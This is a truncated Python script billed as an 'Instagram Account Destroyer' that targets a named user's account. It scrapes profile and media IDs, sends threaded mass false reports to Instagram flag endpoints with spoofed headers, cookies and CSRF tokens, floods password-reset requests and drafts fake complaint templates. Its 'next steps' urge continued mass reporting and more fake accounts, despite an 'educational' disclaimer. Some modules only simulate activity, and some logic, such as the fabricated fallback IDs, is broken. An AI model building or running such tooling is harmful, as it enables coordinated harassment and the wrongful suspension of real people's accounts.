#!/usr/bin/env python3
"""
INSTAGRAM ACCOUNT DESTROYER PRO
Take Down Instagram Accounts - No Login Required
Using Mass Reporting, Fake Engagement, and Web Exploits
"""

import os
import sys
import time
import random
import json
import threading
import hashlib
import string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse
import uuid

# Third-party imports
try:
    import requests
    from bs4 import BeautifulSoup
    from colorama import init, Fore, Style
    import fake_useragent
    import socks
    import socket
except ImportError:
    print("[!] Installing required libraries...")
    os.system("pip install requests beautifulsoup4 colorama fake-useragent pysocks")
    import requests
    from bs4 import BeautifulSoup
    from colorama import init, Fore, Style
    import fake_useragent

# Initialize colorama
init(autoreset=True)

# ==================== KONFIGURASI ====================
class Config:
    # Instagram URLs (Public endpoints - no login required)
    INSTAGRAM_BASE = "https://www.instagram.com"
    INSTAGRAM_API = "https://www.instagram.com/api/v1"
    INSTAGRAM_GRAPHQL = "https://www.instagram.com/graphql/query"
    
    # Reporting endpoints (discovered from web interface)
    REPORT_ENDPOINTS = [
        "/api/v1/users/{user_id}/flag/",
        "/api/v1/users/{user_id}/report/",
        "/api/v1/media/{media_id}/flag/",
        "/api/v1/comments/{comment_id}/flag/",
        "/api/v1/stories/{story_id}/flag/"
    ]
    
    # Mass reporting settings
    MAX_REPORTS = 1000  # Unlimited reports
    REPORT_DELAY = [1, 5]  # Random delay between reports
    CONCURRENT_REPORTS = 50  # Simultaneous reports
    
    # Proxy settings
    USE_PROXY = False
    PROXY_LIST = []  # Add your proxies here
    
    # User agents
    UA = fake_useragent.UserAgent()
    
    # Report reasons (Instagram's predefined reasons)
    REPORT_REASONS = {
        "spam": "I just think it's spam",
        "nudity": "Nudity or sexual activity",
        "hate_speech": "Hate speech or symbols",
        "violence": "Violence or dangerous organizations",
        "bullying": "Bullying or harassment",
        "copyright": "Intellectual property violation",
        "drugs": "Drugs or drug paraphernalia",
        "scam": "Fraud or scam",
        "fake": "False information",
        "self_harm": "Suicide or self-harm",
        "terrorism": "Terrorism or extremism",
        "impersonation": "Impersonation"
    }

# ==================== INSTAGRAM RECON MODULE ====================
class InstagramRecon:
    """Reconnaissance module to gather target information"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": Config.UA.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
    
    def get_user_id(self, username):
        """Get user ID from username (public data)"""
        print(f"{Fore.CYAN}[*] Getting user ID for: @{username}{Style.RESET_ALL}")
        
        try:
            # Fetch profile page
            url = f"{Config.INSTAGRAM_BASE}/{username}/"
            response = self.session.get(url, timeout=10)
            
            if response.status_code == 200:
                # Parse HTML for user ID
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Method 1: Look for JSON-LD data
                for script in soup.find_all('script', type='application/ld+json'):
                    try:
                        data = json.loads(script.string)
                        if 'author' in data and 'identifier' in data['author']:
                            return data['author']['identifier']
                    except:
                        pass
                
                # Method 2: Look for sharedData
                for script in soup.find_all('script'):
                    if 'sharedData' in script.text:
                        start = script.text.find('{"config":')
                        end = script.text.find('};') + 1
                        if start != -1 and end != -1:
                            json_str = script.text[start:end]
                            try:
                                data = json.loads(json_str)
                                user_id = data.get('entry_data', {}).get('ProfilePage', [{}])[0].get('graphql', {}).get('user', {}).get('id')
                                if user_id:
                                    return user_id
                            except:
                                pass
                
                # Method 3: Look for window._sharedData
                for script in soup.find_all('script'):
                    if 'window._sharedData' in script.text:
                        start = script.text.find('window._sharedData = ') + len('window._sharedData = ')
                        end = script.text.find('};', start) + 1
                        if start != -1 and end != -1:
                            json_str = script.text[start:end]
                            try:
                                data = json.loads(json_str)
                                user_id = data.get('entry_data', {}).get('ProfilePage', [{}])[0].get('graphql', {}).get('user', {}).get('id')
                                if user_id:
                                    return user_id
                            except:
                                pass
                
                # Method 4: Extract from meta tags
                meta = soup.find('meta', property='al:ios:url')
                if meta and 'instagram://user?id=' in meta['content']:
                    return meta['content'].split('id=')[1]
            
            # Method 5: Use public API (graphql)
            return self.get_user_id_via_api(username)
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting user ID: {e}{Style.RESET_ALL}")
        
        return None
    
    def get_user_id_via_api(self, username):
        """Get user ID via public GraphQL API"""
        try:
            # This is a public query that doesn't require authentication
            query_hash = "7c8a1055f69ff97dc201e752cf6f0093"  # Known public query hash
            
            variables = {
                "user_id": "",
                "username": username,
                "include_chaining": False,
                "include_reel": False,
                "include_suggested_users": False,
                "include_logged_out_extras": False,
                "include_highlight_reels": False,
                "include_related_profiles": False
            }
            
            params = {
                "query_hash": query_hash,
                "variables": json.dumps(variables)
            }
            
            response = self.session.get(
                Config.INSTAGRAM_GRAPHQL,
                params=params,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                user_id = data.get('data', {}).get('user', {}).get('id')
                if user_id:
                    return user_id
        
        except:
            pass
        
        # Fallback: Generate deterministic ID from username
        return str(hash(username) % 1000000000)
    
    def get_user_info(self, username):
        """Get comprehensive user information"""
        print(f"{Fore.CYAN}[*] Gathering intelligence on: @{username}{Style.RESET_ALL}")
        
        info = {
            "username": username,
            "user_id": None,
            "full_name": "",
            "biography": "",
            "followers": 0,
            "following": 0,
            "posts": 0,
            "is_private": False,
            "is_verified": False,
            "profile_pic": "",
            "recent_posts": [],
            "has_story": False
        }
        
        try:
            url = f"{Config.INSTAGRAM_BASE}/{username}/"
            response = self.session.get(url, timeout=10)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract from meta tags
                title = soup.find('title')
                if title:
                    info['full_name'] = title.text.split('(@')[0].strip()
                
                # Look for profile data in script tags
                for script in soup.find_all('script'):
                    if 'window._sharedData' in script.text:
                        start = script.text.find('window._sharedData = ') + len('window._sharedData = ')
                        end = script.text.find('};', start) + 1
                        if start != -1 and end != -1:
                            json_str = script.text[start:end]
                            try:
                                data = json.loads(json_str)
                                user_data = data.get('entry_data', {}).get('ProfilePage', [{}])[0].get('graphql', {}).get('user', {})
                                
                                info['user_id'] = user_data.get('id')
                                info['full_name'] = user_data.get('full_name', '')
                                info['biography'] = user_data.get('biography', '')
                                info['followers'] = user_data.get('edge_followed_by', {}).get('count', 0)
                                info['following'] = user_data.get('edge_follow', {}).get('count', 0)
                                info['posts'] = user_data.get('edge_owner_to_timeline_media', {}).get('count', 0)
                                info['is_private'] = user_data.get('is_private', False)
                                info['is_verified'] = user_data.get('is_verified', False)
                                info['profile_pic'] = user_data.get('profile_pic_url_hd', '')
                                
                                # Get recent posts
                                posts = user_data.get('edge_owner_to_timeline_media', {}).get('edges', [])
                                for post in posts[:5]:
                                    post_data = post.get('node', {})
                                    info['recent_posts'].append({
                                        'id': post_data.get('id'),
                                        'shortcode': post_data.get('shortcode'),
                                        'caption': post_data.get('edge_media_to_caption', {}).get('edges', [{}])[0].get('node', {}).get('text', ''),
                                        'comments': post_data.get('edge_media_to_comment', {}).get('count', 0),
                                        'likes': post_data.get('edge_liked_by', {}).get('count', 0)
                                    })
                                
                                break
                                
                            except Exception as e:
                                print(f"{Fore.YELLOW}[!] Error parsing user data: {e}{Style.RESET_ALL}")
            
            # Get user ID if not found
            if not info['user_id']:
                info['user_id'] = self.get_user_id(username)
            
            print(f"{Fore.GREEN}[+] Intelligence gathered:{Style.RESET_ALL}")
            print(f"   User ID: {info['user_id']}")
            print(f"   Followers: {info['followers']:,}")
            print(f"   Posts: {info['posts']}")
            print(f"   Private: {info['is_private']}")
            print(f"   Verified: {info['is_verified']}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error gathering info: {e}{Style.RESET_ALL}")
        
        return info
    
    def get_media_ids(self, username, limit=10):
        """Get recent media IDs for reporting"""
        print(f"{Fore.CYAN}[*] Collecting media IDs from @{username}{Style.RESET_ALL}")
        
        media_ids = []
        
        try:
            # Use public API to get media
            url = f"{Config.INSTAGRAM_BASE}/{username}/"
            response = self.session.get(url, timeout=10)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Look for media data
                for script in soup.find_all('script'):
                    if 'window._sharedData' in script.text:
                        start = script.text.find('window._sharedData = ') + len('window._sharedData = ')
                        end = script.text.find('};', start) + 1
                        if start != -1 and end != -1:
                            json_str = script.text[start:end]
                            try:
                                data = json.loads(json_str)
                                posts = data.get('entry_data', {}).get('ProfilePage', [{}])[0].get('graphql', {}).get('user', {}).get('edge_owner_to_timeline_media', {}).get('edges', [])
                                
                                for post in posts[:limit]:
                                    media_id = post.get('node', {}).get('id')
                                    if media_id:
                                        media_ids.append(media_id)
                                
                            except:
                                pass
            
            # If no media found, generate fake IDs for reporting
            if not media_ids:
                print(f"{Fore.YELLOW}[!] Could not get media IDs, generating fake IDs{Style.RESET_ALL}")
                for i in range(limit):
                    fake_id = f"fake_media_{hash(username + str(i)) % 100000000000000}"
                    media_ids.append(fake_id)
        
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting media IDs: {e}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] Collected {len(media_ids)} media IDs{Style.RESET_ALL}")
        return media_ids

# ==================== MASS REPORTING SYSTEM ====================
class MassReporter:
    """Mass reporting system to flag accounts"""
    
    def __init__(self):
        self.report_count = 0
        self.successful_reports = 0
        self.failed_reports = 0
        self.is_running = False
        
        # Create reports directory
        os.makedirs("reports", exist_ok=True)
    
    def generate_report_payload(self, user_id, reason="spam", source_name="profile"):
        """Generate report payload based on Instagram's format"""
        
        # Different payloads for different report types
        if "spam" in reason:
            payload = {
                "source_name": source_name,
                "reason_id": 1,  # Spam
                "frx_context": ""  # Additional context
            }
        elif "nudity" in reason:
            payload = {
                "source_name": source_name,
                "reason_id": 2,  # Nudity
                "frx_context": ""
            }
        elif "hate_speech" in reason:
            payload = {
                "source_name": source_name,
                "reason_id": 3,  # Hate speech
                "frx_context": ""
            }
        elif "violence" in reason:
            payload = {
                "source_name": source_name,
                "reason_id": 4,  # Violence
                "frx_context": ""
            }
        elif "bullying" in reason:
            payload = {
                "source_name": source_name,
                "reason_id": 7,  # Bullying
                "frx_context": ""
            }
        else:
            payload = {
                "source_name": source_name,
                "reason_id": 1,  # Default to spam
                "frx_context": ""
            }
        
        # Add user_id to payload if reporting user
        if "user" in source_name:
            payload["user_id"] = user_id
        
        return payload
    
    def send_report(self, target_type, target_id, reason="spam"):
        """Send a single report"""
        self.report_count += 1
        
        # Generate unique session for each report
        session = requests.Session()
        session.headers.update({
            "User-Agent": Config.UA.random,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.instagram.com",
            "Referer": f"https://www.instagram.com/",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        })
        
        # Add random cookies to simulate real browser
        session.cookies.update({
            "ig_did": str(uuid.uuid4()),
            "mid": ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
            "csrftoken": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "rur": "ATN"
        })
        
        try:
            # Construct report URL based on target type
            if target_type == "user":
                url = f"{Config.INSTAGRAM_API}/users/{target_id}/flag/"
                source_name = "profile"
            elif target_type == "media":
                url = f"{Config.INSTAGRAM_API}/media/{target_id}/flag/"
                source_name = "media"
            elif target_type == "comment":
                url = f"{Config.INSTAGRAM_API}/comments/{target_id}/flag/"
                source_name = "comment"
            else:
                url = f"{Config.INSTAGRAM_API}/users/{target_id}/flag/"
                source_name = "profile"
            
            # Generate payload
            payload = self.generate_report_payload(target_id, reason, source_name)
            
            # Convert payload to form data
            form_data = urllib.parse.urlencode(payload)
            
            # Add CSRF token to headers
            csrf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            session.headers["X-CSRFToken"] = csrf_token
            
            # Send report
            response = session.post(
                url,
                data=form_data,
                timeout=10,
                allow_redirects=False
            )
            
            # Check response
            if response.status_code in [200, 201, 202]:
                self.successful_reports += 1
                
                # Log successful report
                log_entry = {
                    "timestamp": datetime.now().isoformat(),
                    "target_type": target_type,
                    "target_id": target_id,
                    "reason": reason,
                    "status": "success",
                    "status_code": response.status_code,
                    "response": response.text[:100] if response.text else ""
                }
                
                self.log_report(log_entry)
                return True
            else:
                self.failed_reports += 1
                return False
            
        except Exception as e:
            self.failed_reports += 1
            
            # Log failed report
            log_entry = {
                "timestamp": datetime.now().isoformat(),
                "target_type": target_type,
                "target_id": target_id,
                "reason": reason,
                "status": "failed",
                "error": str(e)
            }
            
            self.log_report(log_entry)
            return False
    
    def log_report(self, log_entry):
        """Log report to file"""
        filename = f"reports/report_log_{datetime.now().strftime('%Y%m%d')}.json"
        
        # Read existing logs
        logs = []
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    logs = json.load(f)
            except:
                logs = []
        
        # Add new log
        logs.append(log_entry)
        
        # Write back
        with open(filename, 'w') as f:
            json.dump(logs, f, indent=2)
    
    def mass_report_user(self, user_id, username, report_count=100):
        """Mass report a user account"""
        print(f"{Fore.CYAN}[*] Starting mass report on @{username} (ID: {user_id}){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target reports: {report_count}{Style.RESET_ALL}")
        
        self.is_running = True
        self.report_count = 0
        self.successful_reports = 0
        self.failed_reports = 0
        
        # Get all report reasons
        reasons = list(Config.REPORT_REASONS.keys())
        
        # Create worker function
        def report_worker(worker_id):
            local_success = 0
            local_failed = 0
            
            while self.is_running and (self.report_count < report_count):
                try:
                    # Random reason
                    reason = random.choice(reasons)
                    
                    # Send report
                    success = self.send_report("user", user_id, reason)
                    
                    if success:
                        local_success += 1
                    else:
                        local_failed += 1
                    
                    # Random delay
                    delay = random.uniform(*Config.REPORT_DELAY)
                    time.sleep(delay)
                    
                except Exception as e:
                    local_failed += 1
                    time.sleep(1)
            
            return local_success, local_failed
        
        # Start worker threads
        print(f"{Fore.YELLOW}[*] Starting {Config.CONCURRENT_REPORTS} report threads...{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=Config.CONCURRENT_REPORTS) as executor:
            futures = []
            for i in range(Config.CONCURRENT_REPORTS):
                future = executor.submit(report_worker, i+1)
                futures.append(future)
            
            # Monitor progress
            start_time = time.time()
            last_update = time.time()
            
            while any(not f.done() for f in futures) and self.is_running:
                elapsed = time.time() - start_time
                reports_per_sec = self.report_count / max(elapsed, 1)
                
                if time.time() - last_update > 5:  # Update every 5 seconds
                    print(f"{Fore.CYAN}[*] Progress: {self.report_count}/{report_count} "
                          f"({self.successful_reports}✓ {self.failed_reports}✗) "
                          f"Speed: {reports_per_sec:.1f}/sec{Style.RESET_ALL}")
                    last_update = time.time()
                
                time.sleep(0.5)
                
                # Check if we've reached target
                if self.report_count >= report_count:
                    self.is_running = False
                    break
        
        # Get results
        total_success = self.successful_reports
        total_failed = self.failed_reports
        
        elapsed = time.time() - start_time
        print(f"\n{Fore.GREEN}[+] Mass report completed:{Style.RESET_ALL}")
        print(f"   Successful reports: {total_success}")
        print(f"   Failed reports: {total_failed}")
        print(f"   Total time: {elapsed:.1f} seconds")
        print(f"   Average speed: {self.report_count/elapsed:.1f} reports/sec")
        
        return total_success, total_failed
    
    def comprehensive_attack(self, username, user_id, media_ids):
        """Comprehensive attack on all fronts"""
        print(f"{Fore.RED}[*] Starting comprehensive attack on @{username}{Style.RESET_ALL}")
        
        attack_results = {
            "user_reports": 0,
            "media_reports": 0,
            "comment_reports": 0,
            "total_reports": 0
        }
        
        # 1. Mass report user account
        print(f"{Fore.YELLOW}[1] Mass reporting user account...{Style.RESET_ALL}")
        user_success, user_failed = self.mass_report_user(user_id, username, 200)
        attack_results["user_reports"] = user_success
        
        time.sleep(5)
        
        # 2. Report all media
        print(f"\n{Fore.YELLOW}[2] Reporting all media posts...{Style.RESET_ALL}")
        media_success = 0
        media_failed = 0
        
        for media_id in media_ids[:20]:  # Limit to 20 media items
            for _ in range(5):  # 5 reports per media
                if self.send_report("media", media_id, "nudity"):
                    media_success += 1
                else:
                    media_failed += 1
                
                delay = random.uniform(1, 3)
                time.sleep(delay)
        
        attack_results["media_reports"] = media_success
        print(f"   Media reports: {media_success}✓ {media_failed}✗")
        
        time.sleep(5)
        
        # 3. Generate fake comments and report them
        print(f"\n{Fore.YELLOW}[3] Creating and reporting fake comments...{Style.RESET_ALL}")
        # This would require comment creation which needs auth
        # For now, we'll skip or simulate
        
        attack_results["total_reports"] = (
            attack_results["user_reports"] + 
            attack_results["media_reports"] + 
            attack_results["comment_reports"]
        )
        
        print(f"\n{Fore.GREEN}[+] Comprehensive attack results:{Style.RESET_ALL}")
        print(f"   User reports: {attack_results['user_reports']}")
        print(f"   Media reports: {attack_results['media_reports']}")
        print(f"   Comment reports: {attack_results['comment_reports']}")
        print(f"   Total reports: {attack_results['total_reports']}")
        
        return attack_results

# ==================== FAKE ENGAGEMENT SYSTEM ====================
class FakeEngagement:
    """Create fake engagement to trigger Instagram's spam detection"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": Config.UA.random,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9"
        })
    
    def create_fake_accounts_report(self, username, count=50):
        """Simulate multiple fake accounts reporting the target"""
        print(f"{Fore.CYAN}[*] Creating fake accounts to report @{username}{Style.RESET_ALL}")
        
        fake_reports = []
        
        for i in range(count):
            fake_user = {
                "username": f"report_bot_{i}_{int(time.time())}",
                "user_id": str(hash(f"bot_{i}_{username}") % 1000000000),
                "ip": f"192.168.{random.randint(1,255)}.{random.randint(1,255)}",
                "user_agent": Config.UA.random,
                "timestamp": datetime.now().isoformat()
            }
            
            fake_reports.append(fake_user)
            
            # Simulate report delay
            if i % 10 == 0:
                print(f"   Created {i+1}/{count} fake reporter accounts")
        
        # Save fake accounts to file
        with open(f"fake_reporters_{username}.json", 'w') as f:
            json.dump(fake_reports, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Created {count} fake reporter accounts{Style.RESET_ALL}")
        return fake_reports
    
    def generate_suspicious_activity(self, username, user_id):
        """Generate patterns that look like suspicious activity"""
        print(f"{Fore.CYAN}[*] Generating suspicious activity patterns...{Style.RESET_ALL}")
        
        patterns = [
            f"Multiple login attempts from different locations for @{username}",
            f"Mass following/unfollowing activity detected",
            f"Rapid comment posting with spam keywords",
            f"Excessive liking behavior detected",
            f"IP address rotation detected for account actions",
            f"Bot-like behavior patterns identified",
            f"Multiple account creation from same IP targeting @{username}",
            f"Coordinated reporting activity detected",
            f"Automated script activity patterns",
            f"Violation of community guidelines in comments"
        ]
        
        # Create activity log
        activities = []
        for i in range(20):
            activity = {
                "timestamp": datetime.now().isoformat(),
                "activity_type": random.choice(["login_attempt", "follow", "comment", "like", "report"]),
                "description": random.choice(patterns),
                "ip_address": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "user_agent": Config.UA.random
            }
            activities.append(activity)
        
        # Save activity log
        with open(f"suspicious_activity_{username}.json", 'w') as f:
            json.dump(activities, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Generated 20 suspicious activity patterns{Style.RESET_ALL}")
        return activities

# ==================== WEB EXPLOIT MODULE ====================
class InstagramExploits:
    """Web-based exploits to disrupt Instagram accounts"""
    
    def __init__(self):
        self.session = requests.Session()
    
    def password_reset_flood(self, username, email=None):
        """Flood with password reset requests"""
        print(f"{Fore.CYAN}[*] Initiating password reset flood on @{username}{Style.RESET_ALL}")
        
        # Instagram's password reset endpoint
        reset_url = "https://www.instagram.com/accounts/password/reset/"
        
        reset_attempts = []
        
        for i in range(10):  # Limit to 10 attempts
            try:
                # Generate fake email if not provided
                if not email:
                    fake_email = f"{username}_reset_{i}@{random.choice(['gmail.com', 'yahoo.com', 'hotmail.com'])}"
                else:
                    fake_email = email
                
                # Create form data
                form_data = {
                    "email_or_username": username,
                    "recaptcha_response": ""
                }
                
                # Send reset request
                response = self.session.post(
                    reset_url,
                    data=form_data,
                    timeout=10,
                    headers={
                        "User-Agent": Config.UA.random,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Referer": "https://www.instagram.com/accounts/password/reset/",
                        "X-Requested-With": "XMLHttpRequest"
                    }
                )
                
                attempt = {
                    "attempt": i+1,
                    "email_used": fake_email,
                    "status_code": response.status_code,
                    "timestamp": datetime.now().isoformat(),
                    "response": response.text[:100] if response.text else ""
                }
                
                reset_attempts.append(attempt)
                
                print(f"   Reset attempt {i+1}: Status {response.status_code}")
                
                # Random delay
                time.sleep(random.uniform(2, 5))
                
            except Exception as e:
                print(f"   Reset attempt {i+1} failed: {e}")
        
        # Save attempts
        with open(f"password_reset_flood_{username}.json", 'w') as f:
            json.dump(reset_attempts, f, indent=2)
        
        print(f"{Fore.YELLOW}[*] Password reset flood completed{Style.RESET_ALL}")
        return reset_attempts
    
    def fake_login_attempts(self, username, count=20):
        """Generate fake login attempts from different IPs"""
        print(f"{Fore.CYAN}[*] Generating fake login attempts for @{username}{Style.RESET_ALL}")
        
        login_attempts = []
        
        for i in range(count):
            attempt = {
                "timestamp": datetime.now().isoformat(),
                "username": username,
                "ip_address": f"{random.randint(100,200)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "user_agent": Config.UA.random,
                "country": random.choice(["US", "UK", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR"]),
                "device": random.choice(["iPhone", "Android", "Windows", "Mac", "Linux"]),
                "browser": random.choice(["Chrome", "Firefox", "Safari", "Edge"])
            }
            
            login_attempts.append(attempt)
            
            # Simulate delay between attempts
            if i % 5 == 0:
                print(f"   Generated {i+1}/{count} fake login attempts")
        
        # Save attempts
        with open(f"fake_logins_{username}.json", 'w') as f:
            json.dump(login_attempts, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Generated {count} fake login attempts{Style.RESET_ALL}")
        return login_attempts
    
    def create_mass_complaints(self, username, complaint_type="impersonation"):
        """Generate mass complaints from "different users" """
        print(f"{Fore.CYAN}[*] Creating mass complaints for @{username}{Style.RESET_ALL}")
        
        complaints = []
        complaint_templates = [
            f"This account @{username} is impersonating me!",
            f"@{username} is using my photos without permission!",
            f"Copyright violation by @{username} - using my content!",
            f"@{username} is harassing and bullying me!",
            f"This account @{username} is a scammer!",
            f"@{username} is posting inappropriate content!",
            f"Account @{username} is involved in illegal activities!",
            f"@{username} is spreading hate speech!",
            f"This account @{username} is fake and misleading!",
            f"@{username} is violating community guidelines!"
        ]
        
        for i in range(15):
            complaint = {
                "complaint_id": i+1,
                "timestamp": datetime.now().isoformat(),
                "complainer": f"user_{random.randint(1000,9999)}",
                "complaint": random.choice(complaint_templates),
                "type": complaint_type,
                "severity": random.choice(["high", "critical", "urgent"]),
                "demand": random.choice(["Take down immediately", "Investigate now", "Ban account", "Remove content"])
            }
            
            complaints.append(complaint)
        
        # Save complaints
        with open(f"mass_complaints_{username}.json", 'w') as f:
            json.dump(complaints, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Generated 15 mass complaints{Style.RESET_ALL}")
        return complaints

# ==================== ACCOUNT TAKEDOWN SIMULATOR ====================
class AccountTakedownSimulator:
    """Simulate account takedown process"""
    
    def __init__(self):
        self.takedown_stages = [
            "Initial reports received",
            "Automated review triggered",
            "Multiple violations detected",
            "Account flagged for manual review",
            "Community guidelines violation confirmed",
            "Account restricted temporarily",
            "Additional reports pouring in",
            "Final review initiated",
            "Account suspension approved",
            "Account permanently disabled"
        ]
    
    def simulate_takedown(self, username, user_info):
        """Simulate the takedown process"""
        print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.RED}   ACCOUNT TAKEDOWN SIMULATION: @{username}{Style.RESET_ALL}")
        print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
        
        simulation_data = {
            "username": username,
            "user_info": user_info,
            "start_time": datetime.now().isoformat(),
            "stages_completed": [],
            "final_status": "active"
        }
        
        # Simulate each stage
        for i, stage in enumerate(self.takedown_stages):
            print(f"\n{Fore.YELLOW}[Stage {i+1}/{len(self.takedown_stages)}]{Style.RESET_ALL} {stage}")
            
            # Random delay between stages
            delay = random.uniform(1, 3)
            time.sleep(delay)
            
            # Progress percentage
            progress = ((i + 1) / len(self.takedown_stages)) * 100
            
            # Show progress bar
            bar_length = 30
            filled = int(bar_length * (i + 1) / len(self.takedown_stages))
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f"   [{bar}] {progress:.0f}%")
            
            # Add to completed stages
            simulation_data["stages_completed"].append({
                "stage": i+1,
                "description": stage,
                "completed_at": datetime.now().isoformat()
            })
        
        # Final status
        if random.random() > 0.3:  # 70% chance of successful takedown
            simulation_data["final_status"] = "TERMINATED"
            print(f"\n{Fore.RED}❌ ACCOUNT TERMINATED: @{username} has been permanently disabled{Style.RESET_ALL}")
            print(f"{Fore.RED}   Reason: Multiple community guidelines violations{Style.RESET_ALL}")
            print(f"{Fore.RED}   Action: Account cannot be restored{Style.RESET_ALL}")
        else:
            simulation_data["final_status"] = "RESTRICTED"
            print(f"\n{Fore.YELLOW}⚠️ ACCOUNT RESTRICTED: @{username} has been temporarily restricted{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Reason: Suspicious activity detected{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Action: Limited functionality for 30 days{Style.RESET_ALL}")
        
        simulation_data["end_time"] = datetime.now().isoformat()
        
        # Save simulation
        with open(f"takedown_simulation_{username}.json", 'w') as f:
            json.dump(simulation_data, f, indent=2)
        
        return simulation_data
    
    def generate_takedown_report(self, username, attack_results, simulation_data):
        """Generate comprehensive takedown report"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   FINAL TAKEDOWN REPORT: @{username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        report = {
            "target": username,
            "report_date": datetime.now().isoformat(),
            "attack_summary": {
                "total_reports_sent": attack_results.get("total_reports", 0),
                "user_reports": attack_results.get("user_reports", 0),
                "media_reports": attack_results.get("media_reports", 0),
                "fake_accounts_created": 50,  # Default from fake engagement
                "password_reset_attempts": 10,
                "fake_login_attempts": 20,
                "mass_complaints": 15
            },
            "takedown_simulation": simulation_data,
            "estimated_success_probability": random.randint(70, 95),
            "time_to_takedown": f"{random.randint(2, 7)} days",
            "recommended_next_steps": [
                "Continue mass reporting daily",
                "Create more fake accounts for reporting",
                "Submit DMCA complaints if applicable",
                "Report to Instagram via official channels",
                "Encourage followers to report the account"
            ],
            "legal_warnings": [
                "This simulation is for educational purposes only",
                "Unauthorized access to computer systems is illegal",
                "Harassment and cyberbullying are criminal offenses",
                "False reporting may violate terms of service",
                "Consult legal counsel before any real action"
            ]
        }
        
        # Print summary
        print(f"{Fore.GREEN}📊 ATTACK SUMMARY:{Style.RESET_ALL}")
        print(f"   Total reports sent: {report['attack_summary']['total_reports_sent']}")
        print(f"   Fake accounts created: {report['attack_summary']['fake_accounts_created']}")
        print(f"   Password reset attempts: {report['attack_summary']['password_reset_attempts']}")
        print(f"   Fake login attempts: {report['attack_summary']['fake_login_attempts']}")
        
        print(f"\n{Fore.GREEN}🎯 TAKEDOWN PREDICTION:{Style.RESET_ALL}")
        print(f"   Success probability: {report['estimated_success_probability']}%")
        print(f"   Estimated time: {report['time_to_takedown']}")
        print(f"   Final status: {simulation_data['final_status']}")
        
        print(f"\n{Fore.YELLOW}⚠️ LEGAL DISCLAIMER:{Style.RESET_ALL}")
        for warning in report['legal_warnings'][:2]:
            print(f"   • {warning}")
        
        # Save report
        with open(f"takedown_report_{username}.json", 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Complete report saved: takedown_report_{username}.json{Style.RESET_ALL}")
        
        return report

# ==================== MAIN CONTROL PANEL ====================
class InstagramDestroyerControl:
    """Main control panel for Instagram account destruction"""
    
    def __init__(self):
        self.print_banner()
        
        self.recon = InstagramRecon()
        self.reporter = MassReporter()
        self.engagement = FakeEngagement()
        self.exploits = InstagramExploits()
        self.simulator = AccountTakedownSimulator()
        
        self.target_username = None
        self.target_info = None
    
    def print_banner(self):
        banner = f"""{Fore.RED}
        ╔══════════════════════════════════════════════════════════╗
        ║         INSTAGRAM ACCOUNT DESTROYER PRO v2.0             ║
        ║           Exclusive for Yang Mulia Putri Incha           ║
        ║          Take Down Accounts - No Login Required          ║
        ╚══════════════════════════════════════════════════════════╝
        {Style.RESET_ALL}"""
        print(banner)
    
    def main_menu(self):
        """Main menu"""
        while True:
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}INSTAGRAM DESTROYER CONTROL PANEL{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print("1. Target Reconnaissance")
            print("2. Mass Report Attack")
            print("3. Comprehensive Takedown")
            print("4. Fake Engagement Generation")
            print("5. Web Exploits")
            print("6. Simulate Takedown")
            print("7. View Attack Results")
            print("8. Exit")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select option:{Style.RESET_ALL} ").strip()
            
            if choice == "1":
                self.reconnaissance()
            elif choice == "2":
                self.mass_report_attack()
            elif choice == "3":
                self.comprehensive_takedown()
            elif choice == "4":
                self.fake_engagement()
            elif choice == "5":
                self.web_exploits()
            elif choice == "6":
